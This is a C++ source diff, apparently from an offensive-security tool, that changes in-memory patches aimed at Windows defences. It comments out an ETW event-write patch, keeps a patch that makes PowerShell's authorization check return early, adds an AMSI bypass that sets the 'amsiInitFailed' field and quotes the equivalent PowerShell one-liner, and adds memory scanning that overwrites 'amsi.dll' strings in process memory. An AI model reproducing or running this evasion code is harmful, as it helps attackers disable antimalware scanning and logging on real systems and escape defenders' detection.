@@ -70,31 +70,31 @@ BOOL PatchAmsiScanBuffer()
 }
 
 
-BOOL PatchEtwRet(CLR &clr)
-{
-    // 0xC3 = ret - hàm return ngay, không ghi event nào
-    BYTE patch[1] = { 0xC3 };
-    return PatchUnmanagedFunction(
-        L"ntdll.dll",
-        "EtwEventWriteTransfer",
-        patch,
-        sizeof(patch),
-        0
-    );
-}
-
-BOOL UnpatchEtwRet(CLR& clr)
-{
-    // 0xC3 = ret - hàm return ngay, không ghi event nào
-    BYTE patch[1] = { 0x4C };
-    return PatchUnmanagedFunction(
-        L"ntdll.dll",
-        "EtwEventWriteTransfer",
-        patch,
-        sizeof(patch),
-        0
-    );
-}
+//BOOL PatchEtwRet(CLR &clr)
+//{
+//    // 0xC3 = ret - hàm return ngay, không ghi event nào
+//    BYTE patch[1] = { 0xC3 };
+//    return PatchUnmanagedFunction(
+//        L"ntdll.dll",
+//        "EtwEventWriteTransfer",
+//        patch,
+//        sizeof(patch),
+//        0
+//    );
+//}
+//
+//BOOL UnpatchEtwRet(CLR& clr)
+//{
+//    // 0xC3 = ret - hàm return ngay, không ghi event nào
+//    BYTE patch[1] = { 0x4C };
+//    return PatchUnmanagedFunction(
+//        L"ntdll.dll",
+//        "EtwEventWriteTransfer",
+//        patch,
+//        sizeof(patch),
+//        0
+//    );
+//}
 
 //
 // PowerShell uses the method 'GetSystemLockdownPolicy' (SystemPolicy) to get the
@@ -173,18 +173,70 @@ BOOL PatchTranscriptionOptionFlushContentToDisk(CLR& clr)
 //
 BOOL PatchAuthorizationManagerShouldRunInternal(CLR& clr)
 {
-    BYTE bPatch[] = { 0xc3 }; // ret;
+	BYTE bPatch[] = { 0xc3 }; // ret;
 
-    return PatchManagedFunction(
-        clr,
-        L"System.Management.Automation",
-        L"System.Management.Automation.AuthorizationManager",
-        L"ShouldRunInternal",
-        3,
-        bPatch,
-        ARRAYSIZE(bPatch),
-        0
-    );
+	return PatchManagedFunction(
+		clr,
+		L"System.Management.Automation",
+		L"System.Management.Automation.AuthorizationManager",
+		L"ShouldRunInternal",
+		3,
+		bPatch,
+		ARRAYSIZE(bPatch),
+		0
+	);
+}
+
+//
+// This function bypasses AMSI by setting the static field 'amsiInitFailed' to true.
+// The equivalent PowerShell code is:
+//
+//   [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation').GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+//
+// This causes the AmsiUtils class to believe that AMSI initialization failed,
+// effectively disabling AMSI scanning for the current session.
+//
+BOOL PatchAmsiInitFailed(CLR& clr)
+{
+	BOOL bResult = FALSE;
+	_Assembly* pAssembly = NULL;
+	_Type* pType = NULL;
+	VARIANT vtObject = { 0 };
+	VARIANT vtValue = { 0 };
+
+	vtObject.vt = VT_EMPTY;
+	vtValue.vt = VT_BOOL;
+	vtValue.boolVal = VARIANT_TRUE;
+
+	if (!clr.LoadAssembly(L"System.Management.Automation", &pAssembly)) {
+		PRINT_ERROR("[ERROR] Failed to load assembly 'System.Management.Automation'\n");
+		goto exit;
+	}
+
+	if (!clr.GetType(pAssembly, L"System.Management.Automation.AmsiUtils", &pType)) {
+		PRINT_ERROR("[ERROR] Failed to get type 'System.Management.Automation.AmsiUtils'\n");
+		goto exit;
+	}
+
+	if (!clr.SetFieldValue(
+		pType,
+		BindingFlags(BindingFlags_NonPublic | BindingFlags_Static),
+		vtObject,
+		L"amsiInitFailed",
+		vtValue
+	)) {
+		//wprintf(L"[ERROR] Failed to set field 'amsiInitFailed'\n");
+		goto exit;
+	}
+
+	bResult = TRUE;
+
+exit:
+	if (pType) pType->Release();
+	if (pAssembly) pAssembly->Release();
+	VariantClear(&vtValue);
+
+	return bResult;
 }
 
 BOOL GetProcedureAddress(LPCWSTR pwszModuleName, LPCSTR pszProcedureName, PULONG_PTR pProcedureAddress)
@@ -234,7 +286,6 @@ BOOL PatchProcedure(LPVOID pTargetAddress, LPBYTE pSourceBuffer, DWORD dwSourceB
 
         // Khôi phục protection
         VirtualProtect(ntWriteAddr, 8, oldProtect, &oldProtect);
-        return true;
     }
 
     // Kiểm tra bytes đã được patch chưa
@@ -331,4 +382,231 @@ BOOL FindBufferOffset(LPVOID pStartAddress, LPBYTE pBuffer, DWORD dwBufferSize, 
     //    PRINT_ERROR("Failed to find pattern of size %d within the address range 0x%llx - 0x%llx\n", dwBufferSize, (ULONG_PTR)pStartAddress, (ULONG_PTR)pStartAddress + dwMaxSize);
 
     return bResult;
+}
+
+uintptr_t FindFirstString(
+    uintptr_t startAddress,
+    SIZE_T size,
+    const char* target)
+{
+    if (!target || !*target || size == 0)
+        return 0;
+
+    const SIZE_T targetLen = strlen(target);
+
+    uintptr_t current = startAddress;
+    uintptr_t end = startAddress + size;
+
+    while (current < end)
+    {
+        MEMORY_BASIC_INFORMATION mbi{};
+
+        if (VirtualQuery(
+            reinterpret_cast<LPCVOID>(current),
+            &mbi,
+            sizeof(mbi)) == 0)
+        {
+            return 0;
+        }
+
+        uintptr_t regionBase =
+            reinterpret_cast<uintptr_t>(mbi.BaseAddress);
+
+        uintptr_t regionEnd =
+            regionBase + mbi.RegionSize;
+
+        uintptr_t scanStart =
+            max(current, regionBase);
+
+        uintptr_t scanEnd =
+            min(end, regionEnd);
+
+        if (mbi.State == MEM_COMMIT &&
+            !(mbi.Protect & PAGE_NOACCESS) &&
+            !(mbi.Protect & PAGE_GUARD))
+        {
+            const BYTE* memory =
+                reinterpret_cast<const BYTE*>(scanStart);
+
+            SIZE_T scanSize =
+                scanEnd - scanStart;
+
+            if (scanSize >= targetLen)
+            {
+                for (SIZE_T i = 0;
+                    i <= scanSize - targetLen;
+                    ++i)
+                {
+                    if (memcmp(
+                        memory + i,
+                        target,
+                        targetLen) == 0)
+                    {
+                        return scanStart + i;
+                    }
+                }
+            }
+        }
+
+        if (regionEnd <= current)
+            break;
+
+        current = regionEnd;
+    }
+
+    return 0;
+}
+
+uintptr_t FindFirstStringW(
+    uintptr_t startAddress,
+    SIZE_T size,
+    const wchar_t* target)
+{
+    if (!target || !*target || size == 0)
+        return 0;
+
+    const SIZE_T targetLen = wcslen(target);
+    const SIZE_T targetBytes = targetLen * sizeof(wchar_t);
+
+    uintptr_t current = startAddress;
+    uintptr_t end = startAddress + size;
+
+    while (current < end)
+    {
+        MEMORY_BASIC_INFORMATION mbi{};
+
+        if (VirtualQuery(
+            reinterpret_cast<LPCVOID>(current),
+            &mbi,
+            sizeof(mbi)) == 0)
+        {
+            return 0;
+        }
+
+        uintptr_t regionBase =
+            reinterpret_cast<uintptr_t>(mbi.BaseAddress);
+
+        uintptr_t regionEnd =
+            regionBase + mbi.RegionSize;
+
+        uintptr_t scanStart =
+            max(current, regionBase);
+
+        uintptr_t scanEnd =
+            min(end, regionEnd);
+
+        if (mbi.State == MEM_COMMIT &&
+            !(mbi.Protect & PAGE_NOACCESS) &&
+            !(mbi.Protect & PAGE_GUARD))
+        {
+            const BYTE* memory =
+                reinterpret_cast<const BYTE*>(scanStart);
+
+            SIZE_T scanSize =
+                scanEnd - scanStart;
+
+            if (scanSize >= targetBytes)
+            {
+                for (SIZE_T i = 0;
+                    i <= scanSize - targetBytes;
+                    ++i)
+                {
+                    if (memcmp(
+                        memory + i,
+                        target,
+                        targetBytes) == 0)
+                    {
+                        return scanStart + i;
+                    }
+                }
+            }
+        }
+
+        if (regionEnd <= current)
+            break;
+
+        current = regionEnd;
+    }
+
+    return 0;
+}
+#include <stdio.h>
+void EnumeratePrivateMemory()
+{
+    SYSTEM_INFO si{};
+    GetSystemInfo(&si);
+
+    uintptr_t current =
+        reinterpret_cast<uintptr_t>(
+            si.lpMinimumApplicationAddress);
+
+    uintptr_t maxAddress =
+        reinterpret_cast<uintptr_t>(
+            si.lpMaximumApplicationAddress);
+
+    while (current < maxAddress)
+    {
+        MEMORY_BASIC_INFORMATION mbi{};
+
+        SIZE_T result = VirtualQuery(
+            reinterpret_cast<LPCVOID>(current),
+            &mbi,
+            sizeof(mbi));
+
+        if (result == 0)
+            break;
+
+        uintptr_t base =
+            reinterpret_cast<uintptr_t>(mbi.BaseAddress);
+
+        if (mbi.State == MEM_COMMIT &&
+            mbi.Type == MEM_PRIVATE)
+        {
+            printf(
+                "Base: %p | Size: 0x%llX | Protect: 0x%lX\n",
+                reinterpret_cast<void*>(base),
+                static_cast<unsigned long long>(mbi.RegionSize),
+                mbi.Protect
+            );
+            wchar_t patchAmsi = L'H';
+            LPVOID addrAmsi = (LPVOID)0x1;
+            uintptr_t scanAddress = base;
+            SIZE_T remainingSize = mbi.RegionSize;
+
+            while (remainingSize > 0)
+            {
+                uintptr_t found = FindFirstStringW(
+                    scanAddress,
+                    remainingSize,
+                    L"amsi.dll"
+                );
+
+                if (!found)
+                    break;
+
+                DEBUG("Found string at: %p", (void*)found);
+
+                // xử lý found ở đây
+                wchar_t patchAmsi = L'H';
+                PatchProcedure((PVOID)found, (BYTE*)&patchAmsi, sizeof(char));
+
+                uintptr_t next = found + sizeof(wchar_t);
+
+                if (next <= scanAddress || next >= base + mbi.RegionSize)
+                    break;
+
+                scanAddress = next;
+                remainingSize =
+                    (base + mbi.RegionSize) - scanAddress;
+            }
+
+        }
+
+        uintptr_t next = base + mbi.RegionSize;
+
+        if (next <= current)
+            break;
+
+        current = next;
+    }
 }
